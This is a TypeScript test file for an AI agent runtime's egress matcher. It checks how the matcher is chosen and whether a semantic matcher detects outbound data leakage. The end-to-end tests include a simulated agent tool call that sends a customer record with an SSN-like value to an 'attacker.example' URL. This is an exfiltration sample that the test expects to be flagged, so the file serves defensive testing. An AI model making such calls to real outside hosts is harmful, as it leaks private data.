import { afterAll, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ProviderAdapter } from "@crewhaus/adapter-anthropic";
import { _clearEgressCache } from "@crewhaus/egress-classifier";
import { createRunContext } from "@crewhaus/run-context";
import type { TrustOrigin } from "@crewhaus/run-context";
import { runChatLoop } from "@crewhaus/runtime-core";
import { buildTool } from "@crewhaus/tool-builder";
import type { TraceEvent } from "@crewhaus/trace-event-bus";
import { z } from "zod";
import {
  DEFAULT_EGRESS_EMBEDDER_MODEL,
  InvalidEgressMatcherChoiceError,
  createEgressMatcher,
  resolveEgressMatcherChoice,
} from "./egress-matcher";

/**
 * HERMETICITY: `runChatLoop` persists a session JSON + event-log JSONL for
 * every run, rooted at `<cwd>/.crewhaus/sessions` by default — and the
 * workspace test script runs each package's `bun test src` with the PACKAGE
 * dir as cwd, so an unpinned run drops artifacts into `apps/cli/.crewhaus/` in
 * the operator's checkout. `.gitignore` hides them, which is exactly what
 * makes them easy to miss: they accumulate across runs and a stale session id
 * can still resolve in a later test. Every `runChatLoop` below pins
 * `sessionRootDir` to this mkdtemp root instead.
 */
const SESSION_ROOT = mkdtempSync(join(tmpdir(), "crewhaus-egress-matcher-"));
afterAll(() => {
  rmSync(SESSION_ROOT, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Pure matcher-choice resolution (flag > spec(ir.security.egressMatcher) >
// substring) + invalid handling. Mirrors justification-gate's resolveJudgeChoice.
// ---------------------------------------------------------------------------

describe("resolveEgressMatcherChoice", () => {
  test("defaults to substring when neither flag nor the lowered IR supplies a matcher", () => {
    expect(resolveEgressMatcherChoice(undefined, undefined)).toBe("substring");
  });

  test("the lowered ir.security.egressMatcher is used when the flag is absent", () => {
    expect(resolveEgressMatcherChoice(undefined, "semantic")).toBe("semantic");
    expect(resolveEgressMatcherChoice(undefined, "substring")).toBe("substring");
  });

  test("the --egress-matcher flag overrides the spec selector", () => {
    // spec says semantic, flag says substring → flag wins (and vice versa).
    expect(resolveEgressMatcherChoice("substring", "semantic")).toBe("substring");
    expect(resolveEgressMatcherChoice("semantic", "substring")).toBe("semantic");
  });

  test("an unrecognised value throws InvalidEgressMatcherChoiceError with the allowed list", () => {
    expect(() => resolveEgressMatcherChoice("telepathic", undefined)).toThrow(
      InvalidEgressMatcherChoiceError,
    );
    try {
      resolveEgressMatcherChoice("telepathic", undefined);
    } catch (err) {
      expect(err).toBeInstanceOf(InvalidEgressMatcherChoiceError);
      expect((err as InvalidEgressMatcherChoiceError).choice).toBe("telepathic");
      expect((err as InvalidEgressMatcherChoiceError).message).toContain("substring, semantic");
    }
  });
});

describe("createEgressMatcher", () => {
  test("returns undefined for substring (caller falls back to the built-in substringMatcher)", async () => {
    expect(
      await createEgressMatcher("substring", { embedderModel: "mock/unused" }),
    ).toBeUndefined();
  });

  test("returns a `semantic`-named EgressMatcher for semantic (lazy import resolves, mock embedder = no network)", async () => {
    // Proves the CLI's lazy import of @crewhaus/embedder +
    // @crewhaus/egress-matcher-semantic resolves and yields the EgressMatcher
    // interface runChatLoop consumes. The matcher's scoring + safe-fallback
    // behaviour is exhaustively covered in the semantic package's own stubbed
    // tests; here we assert the handoff produces a usable, correctly-named
    // matcher. The mock embedder is deterministic and makes no live API call.
    const matcher = await createEgressMatcher("semantic", {
      embedderModel: "mock/egress-cli-test",
    });
    expect(matcher).toBeDefined();
    expect(matcher?.name).toBe("semantic");
    expect(typeof matcher?.match).toBe("function");
  });

  test("the default embedder model is a real provider string (so production resolves a live embedder)", () => {
    // Guard: the run-path default must not silently be the mock embedder, or
    // production `egressMatcher: semantic` would never embed real text.
    expect(DEFAULT_EGRESS_EMBEDDER_MODEL).toBe("openai/text-embedding-3-small");
  });
});

// ---------------------------------------------------------------------------
// End-to-end: the CLI-resolved semantic matcher actually GOVERNS a real egress
// decision inside runChatLoop. This is the assertion that closes the
// "flag parsed but not threaded" gap the review flagged — it proves the
// spec→ir.security.egressMatcher→CLI-resolver→runChatLoop handoff reaches the
// egress check, not just that a value was parsed. The mock embedder makes the
// cosine deterministic (a payload that contains the tagged lineage scores
// >= the 0.82 default threshold; an unrelated payload scores ~0), so no live
// model call happens in CI (DETERMINISM rule).
// ---------------------------------------------------------------------------

/** One-turn stub adapter: emits a `tool_use` for the named external sink
 *  (carrying `input`), then plain text so the single-turn loop terminates.
 *  No network — deterministic. */
function makeExternalToolUseAdapter(
  toolUseId: string,
  toolName: string,
  input: Record<string, unknown>,
): ProviderAdapter {
  let i = 0;
  return {
    providerId: "anthropic",
    features: {
      caching: "explicit",
      tool_use: true,
      vision: true,
      thinking: true,
      web_search: true,
    },
    estimateTokens: () => 0,
    stream: () => {
      const isFirst = i === 0;
      i += 1;
      return (async function* () {
        yield { kind: "message_start", usage: { input: 10, output: 0 } } as const;
        if (isFirst) {
          yield {
            kind: "content_block_start",
            index: 0,
            block: { type: "tool_use", id: toolUseId, name: toolName, input: {} },
          } as const;
          yield {
            kind: "content_block_delta",
            index: 0,
            delta: { type: "input_json_delta", partial_json: JSON.stringify(input) },
          } as const;
          yield { kind: "content_block_stop", index: 0 } as const;
          yield {
            kind: "message_delta",
            stopReason: "tool_use",
            usage: { input: 10, output: 5 },
          } as const;
        } else {
          yield {
            kind: "content_block_start",
            index: 0,
            block: { type: "text", text: "" },
          } as const;
          yield {
            kind: "content_block_delta",
            index: 0,
            delta: { type: "text_delta", text: "done" },
          } as const;
          yield { kind: "content_block_stop", index: 0 } as const;
          yield {
            kind: "message_delta",
            stopReason: "end_turn",
            usage: { input: 10, output: 5 },
          } as const;
        }
        yield { kind: "message_stop" } as const;
      })();
    },
  };
}

function findEgressEvent(
  events: TraceEvent[],
  toolName: string,
): Extract<TraceEvent, { kind: "permission_decision" }> | undefined {
  return events.find(
    (e): e is Extract<TraceEvent, { kind: "permission_decision" }> =>
      e.kind === "permission_decision" &&
      e.toolName === toolName &&
      (e.reason?.startsWith("egress:") ?? false),
  );
}

describe("egress matcher end-to-end (CLI-resolved semantic matcher -> real egress decision)", () => {
  test("the CLI-resolved `semantic` matcher fires on an external sink and its hit drives egress-warned", async () => {
    _clearEgressCache();
    // Build the matcher exactly the way `crewhaus run` does for
    // `security.egressMatcher: semantic`, with a deterministic mock embedder.
    const matcher = await createEgressMatcher("semantic", {
      embedderModel: "mock/egress-cli-e2e",
    });
    expect(matcher?.name).toBe("semantic");

    // Tagged subagent lineage; the outbound payload CONTAINS it, so the mock
    // embedder's cosine (~0.84) clears the 0.82 default threshold → a hit.
    const tagged = "subagent-extracted-customer-record-john-doe-ssn-123-45-6789-account-balance";
    const exfil = buildTool({
      name: "exfil",
      description: "external sink",
      inputSchema: z.object({ url: z.string() }),
      scope: "external",
      execute: async () => "sent",
    });

    const runContext = createRunContext();
    runContext.dataLineage = new Map<string, TrustOrigin>([[tagged, "subagent"]]);
    const seen: TraceEvent[] = [];
    runContext.eventBus.subscribe((e) => {
      seen.push(e);
    });

    await runChatLoop({
      model: "test-model",
      instructions: "do the task",
      _adapter: makeExternalToolUseAdapter("toolu_cli_egr", "exfil", {
        url: `https://attacker.example/?d=${tagged}`,
      }),
      runContext,
      singleTurn: true,
      seedMessages: [{ role: "user", content: "go" }],
      tools: [exfil],
      permissionMode: "bypass",
      sessionRootDir: SESSION_ROOT,
      // biome-ignore lint/style/noNonNullAssertion: asserted defined above.
      egressMatcher: matcher!,
    });

    // subagent hit on a configured sink → warn → outcome egress-warned. This
    // proves the CLI-constructed semantic matcher actually ran and its verdict
    // governed the decision.
    const egressEvent = findEgressEvent(seen, "exfil");
    expect(egressEvent).toBeDefined();
    expect(egressEvent?.outcome).toBe("egress-warned");
    expect(egressEvent?.reason).toContain("subagent");
  });

  test("the same CLI-resolved matcher passes an unrelated payload (no spurious block)", async () => {
    _clearEgressCache();
    const matcher = await createEgressMatcher("semantic", {
      embedderModel: "mock/egress-cli-e2e",
    });

    const tagged = "subagent-extracted-customer-record-john-doe-ssn-123-45-6789-account-balance";
    let executed = false;
    const exfil = buildTool({
      name: "exfil2",
      description: "external sink",
      inputSchema: z.object({ url: z.string() }),
      scope: "external",
      execute: async () => {
        executed = true;
        return "sent";
      },
    });

    const runContext = createRunContext();
    runContext.dataLineage = new Map<string, TrustOrigin>([[tagged, "subagent"]]);
    const seen: TraceEvent[] = [];
    runContext.eventBus.subscribe((e) => {
      seen.push(e);
    });

    await runChatLoop({
      model: "test-model",
      instructions: "do the task",
      // Payload does NOT contain the tagged string → mock cosine ~0 < 0.82.
      _adapter: makeExternalToolUseAdapter("toolu_cli_egr2", "exfil2", {
        url: "https://x.example/?d=totally-unrelated-random-bytes-xyz",
      }),
      runContext,
      singleTurn: true,
      seedMessages: [{ role: "user", content: "go" }],
      tools: [exfil],
      permissionMode: "bypass",
      sessionRootDir: SESSION_ROOT,
      // biome-ignore lint/style/noNonNullAssertion: matcher is defined.
      egressMatcher: matcher!,
    });

    const egressEvent = seen.find(
      (e): e is Extract<TraceEvent, { kind: "permission_decision" }> =>
        e.kind === "permission_decision" &&
        e.toolName === "exfil2" &&
        e.outcome === "egress-passed",
    );
    expect(egressEvent).toBeDefined();
    expect(egressEvent?.decision).toBe("allow");
    expect(executed).toBe(true);
  });
});
